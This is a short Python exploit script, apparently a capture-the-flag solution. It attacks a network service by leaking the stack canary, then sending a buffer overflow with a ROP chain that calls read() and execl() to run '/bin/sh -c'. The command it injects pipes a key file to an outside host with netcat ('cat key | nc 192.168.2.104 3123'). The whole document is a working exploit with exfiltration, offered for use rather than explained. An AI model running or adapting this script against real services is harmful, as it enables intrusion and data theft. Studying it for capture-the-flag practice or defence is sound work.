# refer to https://www.mywebproxy.net
from struct import pack
from tio import *
 
read_plt = 0x08048620
execl_plt = 0x08048710
buf = 0x0804B0A0  #.bss section (char s[5000])
pop3ret = 0x08048CD8   #pop ebx; pop edi; pop ebp; retn
binsh = 0x0804970D
 
rop = [
    #read(4,buf,256); (chain0)
    read_plt,       
    pop3ret,        #call ret address (chain1)
    4,
    buf,            #fill "-c\x00\x00cat key | nc 192.168.2.104 3123\x00" into buf
    256,

    # execl  execute command argument list
    # "ls -l /etc/passwd" 
    # eg: execl("/bin/ls", "ls", "-al", "/etc/passwd", (char *) 0);
    execl_plt,      #execl(binsh,binsh,buf,buf+4,0); (chain2)
    0x41414141,
    binsh,          #execute path
    binsh,          #execute file
    buf,            # -c (command argument0)
    buf + 4,        # command argument1
    0               # last argument NULL pointer
]
 
pay = "".join(map(lambda d: pack("<I", d), rop))
 
f = tio("192.168.2.107", 8888)
f.read_until("Give up")
f.send("4\n")
f.read_until(") ")
f.send("y234567890\n")
token = f.read_until_re(r"y234567890\n(...)").group(1)
token = "\x00" + token
f.close()
print "Got canary:", token.encode("hex")
 
f = tio("192.168.2.107", 8888)
f.read_until("Give up")
f.send("4\n")
f.read_until(") ")
f.send("A" * (0x16 - 0xc) + token + "A" * 12 + pay)
 
argv = "-c\x00\x00"
argv += "cat key | nc 192.168.2.104 3123\x00"
 
f.send(argv)
